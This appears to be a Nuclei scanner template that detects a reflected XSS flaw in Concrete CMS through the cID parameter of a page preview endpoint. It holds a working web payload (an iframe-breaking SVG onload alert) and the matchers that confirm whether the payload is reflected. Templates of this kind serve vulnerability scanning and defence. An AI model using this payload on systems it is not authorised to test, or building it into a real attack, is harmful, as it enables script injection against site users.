id: concrete-cms-xss

info:
  name: Concrete CMS XSS
  author: djoevanka
  description: The Concrete CMS is vulnerable to Reflected XSS using vulnerable param cID
  reference:
    - https://twitter.com/JacksonHHax/status/1389222207805661187
  severity: medium
  tags: concrete,xss

requests:
  - method: GET
    path:
      - '{{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert(Xss)>'
  
    matchers-condition: and
    matchers:
      - part: body
        type: word
        words:
          - "</iframe><svg/onload=alert(Xss)"

      - type: status
        part: header
        status:
          - 200
    
